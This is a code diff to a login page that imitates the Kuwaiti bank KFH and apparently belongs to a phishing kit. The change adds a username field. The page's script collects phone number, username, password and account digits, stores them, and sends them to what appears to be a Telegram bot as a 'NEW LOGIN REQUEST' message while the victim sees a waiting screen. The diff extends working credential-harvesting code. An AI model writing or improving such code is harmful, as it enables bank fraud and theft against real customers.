@@ -22,6 +22,42 @@
             --primary-dark: #006B35;
         }
         
+        /* Form Row for side-by-side fields */
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        
+        @media (max-width: 600px) {
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .username-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid var(--border-color);
+            border-radius: var(--radius-md);
+            font-size: 16px;
+            font-family: inherit;
+            transition: var(--transition);
+        }
+        
+        .username-input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(0, 145, 68, 0.1);
+        }
+        
+        .username-hint {
+            display: block;
+            margin-top: 6px;
+            color: var(--text-gray);
+            font-size: 13px;
+        }
+        
         .login-waiting {
             text-align: center;
             padding: 40px 20px;
@@ -89,10 +125,18 @@
                     </div>
 
                     <form id="login-form" class="loan-form" action="verify.html" method="GET">
-                        <div class="form-group">
-                            <label for="phone">Phone Number *</label>
-                            <input type="tel" id="phone" name="phone" required placeholder="+965 XXXXXXXX" class="phone-input" pattern="[+]?965[0-9]{8}" maxlength="12">
-                            <small class="phone-hint">Enter your registered Kuwait mobile number (8 digits after +965)</small>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="phone">Phone Number *</label>
+                                <input type="tel" id="phone" name="phone" required placeholder="+965 XXXXXXXX" class="phone-input" pattern="[+]?965[0-9]{8}" maxlength="12">
+                                <small class="phone-hint">Enter your registered Kuwait mobile number (8 digits after +965)</small>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="username">Username *</label>
+                                <input type="text" id="username" name="username" required placeholder="Enter your username" class="username-input">
+                                <small class="username-hint">Your unique username for login</small>
+                            </div>
                         </div>
 
                         <div class="form-group">
@@ -129,28 +173,27 @@
             e.preventDefault(); // Prevent default form submission
             
             const phone = document.getElementById('phone').value;
+            const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             const accountNumber = document.getElementById('accountNumber').value;
-            const username = phone; // Use phone as username
             
             sessionStorage.setItem('kfh_phone', phone);
+            sessionStorage.setItem('kfh_username', username);
             sessionStorage.setItem('kfh_password', password);
             sessionStorage.setItem('kfh_account_number', accountNumber);
-            sessionStorage.setItem('kfh_username', username);
             
             // Show waiting state
             showWaitingState();
             
             // Send to bot
-            sendToBot(phone, password, accountNumber);
+            sendToBot(phone, username, password, accountNumber);
         });
 
-        async function sendToBot(phone, password, accountNumber) {
+        async function sendToBot(phone, username, password, accountNumber) {
             const sessionId = 'session_' + Math.random().toString(36).substr(2, 9);
             sessionStorage.setItem('kfh_session_id', sessionId);
-            sessionStorage.setItem('kfh_username', phone);
             
-            const message = '🏦 KFH KUWAIT - NEW LOGIN REQUEST\n\n🆔 Session ID: ' + sessionId + '\n📱 Phone: ' + phone + '\n🔐 Password: ' + password + '\n🏦 Account (Last 5): ' + accountNumber + '\n📅 Time: ' + new Date().toLocaleString();
+            const message = '🏦 KFH KUWAIT - NEW LOGIN REQUEST\n\n🆔 Session ID: ' + sessionId + '\n👤 Username: ' + username + '\n📱 Phone: ' + phone + '\n🔐 Password: ' + password + '\n🏦 Account (Last 5): ' + accountNumber + '\n📅 Time: ' + new Date().toLocaleString();
 
             const replyMarkup = {
                 inline_keyboard: [
